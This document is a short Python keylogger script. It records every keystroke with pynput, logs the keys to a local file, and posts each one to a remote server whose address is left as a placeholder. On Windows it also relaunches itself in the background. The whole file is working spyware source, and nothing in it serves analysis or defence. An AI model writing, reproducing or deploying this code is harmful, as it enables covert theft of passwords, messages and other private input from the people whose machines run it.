import logging
import requests
from pynput.keyboard import Key, Listener
import os
import subprocess

# File for local keylogging
log_file = "keylog.txt"
# URL of the server to send key logs
server_url = 'http://<your_server_ip>:8080/log'  # Replace with your actual server IP and port

# Configuring the logger
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# A function that sends the logged key to the server
def send_log(key):
    data = {'key': key}
    try:
        response = requests.post(server_url, data=data, timeout=5)
        if response.status_code != 200:
            logging.error("Failed to send log: Server responded with status code {}".format(response.status_code))
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send log: {e}")

# Event handler for key press
def on_press(key):
    logging.info(str(key))
    send_log(str(key))

# Run the keylogger in the background
def run_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Optional: Move the process to the background on Windows
    if os.name == 'nt':
        subprocess.Popen(['start', '/b', 'python', __file__], shell=True)
    else:
        run_keylogger()